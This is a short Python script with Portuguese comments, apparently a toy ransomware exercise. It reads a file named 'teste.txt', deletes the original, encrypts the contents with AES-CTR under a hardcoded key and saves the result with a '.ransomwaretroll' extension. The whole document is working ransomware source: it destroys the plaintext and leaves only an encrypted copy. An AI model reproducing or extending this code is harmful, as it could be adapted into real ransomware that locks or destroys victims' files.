import os
import pyaes


# arquivos que sera aberto 

file_name = 'teste.txt'
file = open(file_name,'rb')
file_data = file.read()
file.close()

# Remover O Arquivo Original 

os.remove(file_name)

# Criando a Chave De Encriptação

key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

#criptografar o Arquivo

crypto_data = aes.encrypt(file_data)

## Salvar o Arquivo Criptografado

new_file = file_name + ".ransomwaretroll"
new_file = open(f'{new_file}','wb')
new_file.write(crypto_data)
new_file.close()
